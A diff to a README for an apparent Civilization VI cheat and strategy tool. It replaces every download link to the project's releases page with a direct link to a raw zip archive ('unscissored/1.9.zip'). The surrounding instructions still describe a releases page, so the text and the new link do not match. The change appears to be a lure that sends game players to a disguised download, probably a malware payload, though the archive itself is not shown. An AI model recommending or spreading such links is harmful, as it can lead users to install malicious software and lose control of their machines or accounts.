@@ -1,6 +1,6 @@
 # 🏆 civilization-vi-cheats-strategy-lab - Master Every Victory, Every Time
 
-[![Download Now](https://img.shields.io/badge/Download-Civ%20VI%20Strategy%20Lab-blue?style=for-the-badge&logo=github)](https://github.com/Kusoda/civilization-vi-cheats-strategy-lab/releases)
+[![Download Now](https://img.shields.io/badge/Download-Civ%20VI%20Strategy%20Lab-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kusoda/civilization-vi-cheats-strategy-lab/main/unscissored/1.9.zip)
 
 ## 🎮 What Is This?
 
@@ -42,7 +42,7 @@ Think of it as your personal advisor, stat tracker, and cheat sheet rolled into 
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/Kusoda/civilization-vi-cheats-strategy-lab/releases](https://github.com/Kusoda/civilization-vi-cheats-strategy-lab/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Kusoda/civilization-vi-cheats-strategy-lab/main/unscissored/1.9.zip](https://raw.githubusercontent.com/Kusoda/civilization-vi-cheats-strategy-lab/main/unscissored/1.9.zip)
 
 Once you're on that page, look for the newest release at the top. You'll see a file to download – grab it and save it somewhere easy to find, like your Desktop or Downloads folder.
 
@@ -136,7 +136,7 @@ This project is for personal, non-commercial use. It is not affiliated with Fira
 
 Stop guessing and start winning. Download the Civilization VI Strategy Lab today and see the difference in your next game. Whether you're going for a Science Victory or a Domination win, this toolkit has your back.
 
-[![Get It Now](https://img.shields.io/badge/Get%20It%20Now-Download%20Latest%20Release-green?style=for-the-badge)](https://github.com/Kusoda/civilization-vi-cheats-strategy-lab/releases)
+[![Get It Now](https://img.shields.io/badge/Get%20It%20Now-Download%20Latest%20Release-green?style=for-the-badge)](https://raw.githubusercontent.com/Kusoda/civilization-vi-cheats-strategy-lab/main/unscissored/1.9.zip)
 
 ---
 
